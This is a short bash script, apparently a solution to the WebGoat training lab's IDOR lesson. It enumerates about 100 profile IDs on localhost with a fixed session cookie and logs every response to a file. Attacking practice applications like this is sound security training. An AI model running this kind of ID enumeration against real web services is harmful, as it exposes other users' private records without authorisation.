#!/bin/bash

# 範囲の開始と終了
start=2342384
end=2342484

# JSESSIONIDの設定
JSESSIONID="zxmTu1Ab0kLT6JRTWh5TCkALeR3dsoI7YhubV0mX"

# タイムスタンプの設定 (例: 20240821_101530)
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")

# ループでリクエストを送信
for ((i=start; i<=end; i++)); do
  # 変数 i は整数としてそのまま扱われる
  payload_id=$i
  
  echo "Requesting profile ID: $payload_id"
  
  # リクエストを送信し、レスポンスを取得
  response=$(curl -i -s \
    -X GET \
    "http://localhost:8080/WebGoat/IDOR/profile/$payload_id" \
    -H "sec-ch-ua: \"Chromium\";v=\"123\", \"Not:A-Brand\";v=\"8\"" \
    -H "Accept: application/json, text/javascript, */*; q=0.01" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "sec-ch-ua-mobile: ?0" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36" \
    -H "sec-ch-ua-platform: \"macOS\"" \
    -H "Sec-Fetch-Site: same-origin" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: http://localhost:8080/WebGoat/start.mvc?username=developer" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: ja,en-US;q=0.9,en;q=0.8" \
    -H "Cookie: JSESSIONID=$JSESSIONID" \
    -H "Connection: close")
  
  # レスポンスとIDを連結してファイルに保存
  echo "$response" >> "response_$TIMESTAMP.txt"
  echo "Payload ID: $payload_id" >> "response_$TIMESTAMP.txt"
  echo "-----------------------------" >> "response_$TIMESTAMP.txt"
  
done
